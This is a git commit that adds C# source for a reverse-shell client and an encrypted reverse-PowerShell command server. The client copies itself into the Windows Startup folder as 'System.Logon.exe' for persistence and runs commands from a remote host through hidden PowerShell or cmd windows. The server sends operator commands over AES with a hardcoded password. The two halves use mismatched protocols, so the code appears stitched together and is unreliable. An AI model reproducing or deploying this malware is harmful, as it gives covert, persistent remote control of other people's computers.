ffdad4501fdb90e4f03b53d2721c524b5d945242
cglang <adolphlanglang@163.com>
2022-02-17 00:05:30 +0800

    添加项目文件。

---
+++ Ddon.ReverseShell.Client/Program.cs
@@ -0,0 +1,153 @@
+﻿using System.Diagnostics;
+using System.Net.Sockets;
+using System.Text;
+
+namespace ReverseShell
+{
+    class Program
+    {
+        static void Main(string[] args)
+        {
+            var workingPath = AppDomain.CurrentDomain.BaseDirectory[0..^1];
+            var startupPath = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
+            if (workingPath.Equals(startupPath))
+            {
+                ConnectServer();
+            }
+            else
+            {
+                SelfReplication(startupPath);
+            }
+        }
+
+        /// <summary>
+        /// 不断的链接服务器往服务器发送接收数据
+        /// </summary>
+        static void ConnectServer()
+        {
+            var args = new string[] { "127.0.0.1", "1377", "powershell.exe" };
+            if (args.Length < 3)
+            {
+                Console.ForegroundColor = ConsoleColor.Yellow;
+                Console.WriteLine("Usage: ReverseShell.exe <ip address> <port> <cmd.exe or powershell.exe>");
+                Console.ForegroundColor = ConsoleColor.White;
+                Environment.Exit(1);
+            }
+
+            string IpAddress = args[0];
+            int Port = int.Parse(args[1]);
+            string CommandType = args[2];
+            string Command;
+
+            if (CommandType != "cmd.exe" && CommandType != "powershell.exe")
+            {
+                Console.ForegroundColor = ConsoleColor.Yellow;
+                Console.WriteLine("Usage: ReverseShell.exe <ip address> <port> <cmd.exe or powershell.exe>");
+                Console.ForegroundColor = ConsoleColor.White;
+                Environment.Exit(1);
+            }
+            else
+            {
+                TcpClient client = new(IpAddress, Port);
+                Console.ForegroundColor = ConsoleColor.Yellow;
+                Console.WriteLine("[+] Connected to {0} on port {1}", IpAddress, Port);
+                Console.ForegroundColor = ConsoleColor.White;
+                try
+                {
+                    while (true)
+                    {
+                        NetworkStream stream = client.GetStream();
+
+                        string CommandPrompt = ">>";
+                        byte[] SendCommandBuffer = Encoding.Default.GetBytes(CommandPrompt);
+                        stream.Write(SendCommandBuffer, 0, SendCommandBuffer.Length);
+
+
+                        byte[] ReceiveCommandBuffer = new byte[1024];
+                        int ResponseData = stream.Read(ReceiveCommandBuffer, 0, ReceiveCommandBuffer.Length);
+
+                        Array.Resize(ref ReceiveCommandBuffer, ResponseData);
+
+                        Command = Encoding.Default.GetString(ReceiveCommandBuffer);
+
+                        if (Command == "exit\n" || Command == "quit\n")
+                        {
+                            stream.Close();
+                            client.Close();
+                            break;
+                        }
+
+                        Process p = CreateProcess(Command, CommandType == "powershell.exe");
+
+                        string Output = p.StandardOutput.ReadToEnd();
+                        string Error = p.StandardError.ReadToEnd();
+
+                        byte[] OutputBuffer = Encoding.UTF8.GetBytes(Output);
+                        byte[] ErrorBuffer = Encoding.UTF8.GetBytes(Error);
+
+                        stream.Write(OutputBuffer, 0, OutputBuffer.Length);
+                        stream.Write(ErrorBuffer, 0, ErrorBuffer.Length);
+                    }
+                }
+                catch (ArgumentNullException e)
+                {
+                    Console.ForegroundColor = ConsoleColor.Red;
+                    Console.WriteLine("[!] Error: {0}", e.Message);
+                    Console.ForegroundColor = ConsoleColor.White;
+                    Environment.Exit(1);
+                }
+                catch (SocketException e)
+                {
+                    Console.ForegroundColor = ConsoleColor.Red;
+                    Console.WriteLine("[!] Error: {0}", e.Message);
+                    Console.ForegroundColor = ConsoleColor.White;
+                    Environment.Exit(1);
+                }
+                catch (System.IO.IOException e)
+                {
+                    Console.ForegroundColor = ConsoleColor.Red;
+                    Console.WriteLine("[!] Error: {0}", e.Message);
+                    Console.ForegroundColor = ConsoleColor.White;
+                    Environment.Exit(1);
+                }
+            }
+        }
+
+        static Process CreateProcess(string command, bool isPowerShell)
+        {
+            Process process = new();
+            process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
+            process.StartInfo.CreateNoWindow = true;
+            if (isPowerShell)
+            {
+                process.StartInfo.FileName = "powershell.exe";
+                process.StartInfo.Arguments = "-Command " + command;
+            }
+            else
+            {
+                process.StartInfo.FileName = "cmd.exe";
+                process.StartInfo.Arguments = "/C " + command;
+            }
+            process.StartInfo.RedirectStandardOutput = true;
+            process.StartInfo.RedirectStandardError = true;
+            process.StartInfo.UseShellExecute = false;
+            process.Start();
+            return process;
+        }
+
+
+        /// <summary>
+        /// 把自己复制到指定目录
+        /// </summary>
+        /// <param name="path"></param>
+        static void SelfReplication(string path)
+        {
+            var self = Process.GetCurrentProcess().MainModule?.FileName!;
+            var file = Path.Combine(path, "System.Logon.exe");
+            if (!File.Exists(file))
+            {
+                File.Copy(self, file);
+            }
+        }
+    }
+}
---
+++ DdonReversePowershell.Server/Program.cs
@@ -0,0 +1,235 @@
+﻿using System.Net;
+using System.Net.Sockets;
+using System.Security.Cryptography;
+using System.Text;
+
+public class Program
+{
+
+    public static string Password = "Sup3rS3cur3P4ssw0rd";
+    public static Thread ConnChecker;
+    public static string ReadLine()
+    {
+        Stream inputStream = Console.OpenStandardInput(100000);
+        byte[] bytes = new byte[100000];
+        int outputLength = inputStream.Read(bytes, 0, 100000);
+        //Console.WriteLine(outputLength);
+        char[] chars = Encoding.UTF7.GetChars(bytes, 0, outputLength);
+        return new string(chars);
+    }
+
+    public static byte[] ReadByteArray(Stream s)
+    {
+        byte[] rawLength = new byte[sizeof(int)];
+        if (s.Read(rawLength, 0, rawLength.Length) != rawLength.Length)
+        {
+            throw new SystemException("Stream did not contain properly formatted byte array");
+        }
+
+        byte[] buffer = new byte[BitConverter.ToInt32(rawLength, 0)];
+        if (s.Read(buffer, 0, buffer.Length) != buffer.Length)
+        {
+            throw new SystemException("Did not read byte array properly");
+        }
+
+        return buffer;
+    }
+
+    public static void StartConnChecker(Socket handler)
+    {
+        ConnChecker = new Thread(() =>
+        {
+            while (true)
+            {
+                try
+                {
+                    //Console.WriteLine("sending...");
+                    Send(handler, "NOCOMM");
+                    Receive(handler);
+                }
+                catch
+                {
+                    Console.WriteLine("[-] Client disconnected from server!");
+                    try
+                    {
+                        handler.Shutdown(SocketShutdown.Both);
+                        handler.Close();
+                    }
+                    catch { }
+                    Environment.Exit(0);
+                    break;
+                }
+                Thread.Sleep(2000);
+            }
+        });
+        ConnChecker.Start();
+    }
+
+    public static string EncryptStringAES(string rawstring, string password)
+    {
+        byte[] saltBytes = new byte[] { 1, 2, 3, 4, 5, 6, 7, 8 };
+        string outStr = null;
+        RijndaelManaged aesAlg = null;
+        try
+        {
+            Rfc2898DeriveBytes key = new Rfc2898DeriveBytes(password, saltBytes);
+            aesAlg = new RijndaelManaged();
+            aesAlg.Key = key.GetBytes(aesAlg.KeySize / 8);
+            ICryptoTransform encryptor = aesAlg.CreateEncryptor(aesAlg.Key, aesAlg.IV);
+            using (MemoryStream msEncrypt = new MemoryStream())
+            {
+                msEncrypt.Write(BitConverter.GetBytes(aesAlg.IV.Length), 0, sizeof(int));
+                msEncrypt.Write(aesAlg.IV, 0, aesAlg.IV.Length);
+                using (CryptoStream csEncrypt = new CryptoStream(msEncrypt, encryptor, CryptoStreamMode.Write))
+                {
+                    using (StreamWriter swEncrypt = new StreamWriter(csEncrypt))
+                    {
+                        swEncrypt.Write(rawstring);
+                    }
+                }
+                outStr = Convert.ToBase64String(msEncrypt.ToArray());
+            }
+        }
+        finally
+        {
+            if (aesAlg != null)
+                aesAlg.Clear();
+        }
+        return outStr;
+    }
+
+    public static string DecryptStringAES(string encryptedString, string password)
+    {
+        byte[] saltBytes = new byte[] { 1, 2, 3, 4, 5, 6, 7, 8 };
+        RijndaelManaged aesAlg = null;
+        string plaintext = null;
+        try
+        {
+            Rfc2898DeriveBytes key = new Rfc2898DeriveBytes(password, saltBytes);
+            byte[] bytes = Convert.FromBase64String(encryptedString);
+            using (MemoryStream msDecrypt = new MemoryStream(bytes))
+            {
+                aesAlg = new RijndaelManaged();
+                aesAlg.Key = key.GetBytes(aesAlg.KeySize / 8);
+                aesAlg.IV = ReadByteArray(msDecrypt);
+                ICryptoTransform decryptor = aesAlg.CreateDecryptor(aesAlg.Key, aesAlg.IV);
+                using (CryptoStream csDecrypt = new CryptoStream(msDecrypt, decryptor, CryptoStreamMode.Read))
+                {
+                    using (StreamReader srDecrypt = new StreamReader(csDecrypt))
+                    {
+                        plaintext = srDecrypt.ReadToEnd();
+                    }
+                }
+            }
+        }
+        finally
+        {
+            if (aesAlg != null)
+                aesAlg.Clear();
+        }
+        return plaintext;
+    }
+
+    public static void StartListening(int port)
+    {
+        Console.WriteLine("[+++] ReversePowerNoidv2 - Reverse Powershell has never been this paranoid.");
+        IPAddress ipAddress = IPAddress.Parse("0.0.0.0");
+        IPEndPoint localEndPoint = new IPEndPoint(ipAddress, port);
+
+        // Create a TCP/IP socket.  
+        Socket listener = new Socket(ipAddress.AddressFamily,
+            SocketType.Stream, ProtocolType.Tcp);
+
+        // Bind the socket to the local endpoint and
+        // listen for incoming connections.  
+        try
+        {
+            listener.Bind(localEndPoint);
+            listener.Listen(10);
+
+            // Start listening for connections.  
+            Console.Write("[*] Waiting for a connection...");
+            // Program is suspended while waiting for an incoming connection.  
+            Socket handler = listener.Accept();
+            Console.WriteLine("Connected to {0}!", handler.RemoteEndPoint.ToString());
+            StartConnChecker(handler);
+            while (true)
+            {
+                string pwd = Receive(handler);
+                Console.Write("RPN {0}> ", pwd);
+                string command = ReadLine().Trim();
+                if (String.IsNullOrEmpty(command))
+                {
+                    Send(handler, "NOCOMM");
+                    continue;
+                }
+                if (String.Equals(command, "exit", StringComparison.OrdinalIgnoreCase))
+                {
+                    Send(handler, command);
+                    ConnChecker.Abort();
+                    break;
+                }
+                ConnChecker.Abort();
+                Send(handler, command);
+                string respond = Receive(handler);
+                Console.WriteLine(respond);
+                StartConnChecker(handler);
+            }
+            try
+            {
+                handler.Shutdown(SocketShutdown.Both);
+                handler.Close();
+            }
+            catch { }
+
+        }
+        catch (Exception e)
+        {
+            Console.WriteLine(e.ToString());
+        }
+
+        Console.WriteLine("\nPress ENTER to continue...");
+        Console.Read();
+
+    }
+
+    public static void Send(Socket handler, String data)
+    {
+        string dataEnc = EncryptStringAES(data, Password);
+        byte[] byteData = Encoding.ASCII.GetBytes(dataEnc);
+        handler.Send(byteData);
+    }
+
+    public static string Receive(Socket handler)
+    {
+        byte[] bytes = new byte[501474836];
+        int bytesRec = handler.Receive(bytes);
+        return DecryptStringAES(Encoding.ASCII.GetString(bytes, 0, bytesRec), Password);
+    }
+
+    public static void Main(string[] args)
+    {
+        if (!args.Any())
+        {
+            args = new string[] { "3249" };
+        }
+        int port = 0;
+        if (args.Length < 1)
+        {
+            Console.WriteLine("Usage : server.exe <port>");
+            return;
+        }
+        if (!Int32.TryParse(args[0], out port))
+        {
+            Console.WriteLine("[-] Please enter a valid port for the first parameter!");
+            return;
+        }
+        if (port > 65535 || port == 0)
+        {
+            Console.WriteLine("[-] Please enter a valid port for the first parameter!");
+            return;
+        }
+        StartListening(port);
+        return;
+    }
+}
